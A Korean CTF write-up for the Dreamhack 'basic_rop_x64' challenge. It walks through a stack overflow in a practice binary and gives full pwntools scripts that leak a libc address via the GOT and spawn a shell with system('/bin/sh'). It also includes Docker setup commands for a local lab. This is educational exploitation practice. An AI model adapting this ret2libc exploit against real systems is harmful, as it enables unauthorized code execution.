# basic_rop_x64

**실습 코드**

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}

```

실습 코드를 쭉 보니 read에서 buf 에 오버플로우가 일어나니까  
그냥 read 로 got 읽고 write로 써서 알아낸 다음에   
system 셀까지 킬 수 있을 거 같다.    

<br>

![image](https://github.com/user-attachments/assets/74383a8a-9b6c-484d-a607-945724f69418)

적용된 보안 목록을 보니까 카나리가 없다.  
그럼 처음 read에 got 에서 read 함수 주소를 들고와야겠다.

<br>

![image](https://github.com/user-attachments/assets/7ecd8845-bc9b-446d-94cd-8f7cc6171859)

read 전에 대충 브레이크를 걸고 H 문자열을 넣어서 스택 구조를 봐준다  

<br>

![image](https://github.com/user-attachments/assets/3d152412-a7b8-406c-9580-c85f430b8609)

![image](https://github.com/user-attachments/assets/286f6232-0d55-47a8-a4ed-1e5f1d772238)

buf(64바이트) +SFP(8바이트) + 리턴주소(8바이트)  
인게 잘 보이니까 쓰레기값 72바이트 위에 바로 원하는 걸 넣으면 되겠다  

우선 got에 read 함수 주소를 알아야하니까   
덮어씌울 값 구조부터 떠올려보자   

read는 인자가 세개니까 rdi, rsi, rdx 순서대로 인자가 들어간다   

내가 원하는 건 read(0, read@got, 0x8) 이니까 각각 숫자를 넣을 수 있도록    
pop 리턴 가젯들을 찾아준다   

<br>


![image](https://github.com/user-attachments/assets/fb26f17c-2bf0-4a82-b9b0-a034e4fb9bbe)

근데   
pop rdi는 찾았고 rsi랑 rdx가 따로 있는게 없어서  
pop rsi ; pop r15 ; ret 얘를 써야겠다  

이 파일에서는 rdx 가 이전 read에 의해 충분히 크게 들어가니까 앞에 두개만 신경써서 넣어주겠다  

`pop rdi` : 0x400883  

`pop rsi ; pop r15 ; ret` : 0x400881  

<br>


![image](https://github.com/user-attachments/assets/2f36d30d-58a3-4eb6-b152-5b9d2aeb29cf)

혹시 필요할지도 모르니 ret도 찾아놨다.  

```python
from pwn import *

# p = remote('host3.dreamhack.games',23241)
p = process('./basic_rop_x64')
e = ELF('./basic_rop_x64')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main_addr = e.symbols['main']

payload = b'A'*0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
payload += p64(main_addr)

p.send(payload)
p.recvuntil(b'A'*0x40)
leaked_read = u64(p.recvn(6) + b'\x00'*2)
slog('leaked puts', leaked_read)

```

이렇게 코드를 짰다.  

`pop rdi` 랑 `pop rsi` 에 각각 `1`과 `read@got`를 넣은 뒤 메인으로 복귀했다.   
`write(1, read@got, 기존 rdx)` 이런 코드가 된거다. (8 말고 아무 값이나 넣어도 상관없다.)   

실행시켜보면   

<br>


![image](https://github.com/user-attachments/assets/5bfbcb54-0411-4da8-940b-520a0f667041)

잘 나온다.   

main으로 돌아 왔고 got까지 구했으니 이젠 system 호출해서 /bin/sh까지 적어보겠다  

그냥 쓰레기값 0x48 바이트 뒤에  
시스템 함수랑 binsh 를 인자로 넣어서 보내게 짜봤다.  

```python
from pwn import *

p = remote('host3.dreamhack.games',23241)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main_addr = e.symbols['main']

payload = b'A'*0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
payload += p64(main_addr)

p.send(payload)
p.recvuntil(b'A'*0x40)
leaked_read = u64(p.recvn(6) + b'\x00'*2)
slog('leaked puts', leaked_read)

libc_base = leaked_read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x48
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)
p.interactive() 
```

이제 이걸 보내보면  

<br>


![image](https://github.com/user-attachments/assets/fbfbaa10-f9c9-4c8e-adba-648a97d7e355)

잘 나온다.  

이번 실습도 로컬에서 실행이 안됐었다.  
`p = process('./basic_rop_x64', env={'LD_PRELOAD': './libc.so.6'})`  
로 같이 받은 libc 파일을 강제 참조를 시켜봐도 안됐다.  

그래서 그냥 실습 파일에 같이 있던 도커 파일로 실습 환경을 구축해줬는데 
잘 됐다.    

실습환경 구축하는 방법은    

```bash
$ docker build -t basic_rop_image .
$ docker run -d -p 10001:10001 --name basic_rop_container basic_rop_image
```

이렇게 도커 이미지 생성해주고 로컬 포트에 이어주면 된다  
그리고 기존코드에서  

```bash
from pwn import *

p = remote('localhost', 10001)
```

이렇게만 바꿔주면 쉽게 만들 수 있다.  


**로컬 실행**  
![image](https://github.com/user-attachments/assets/40455500-0498-48ce-a8ab-b0436a142c62)

둘 다 성공!
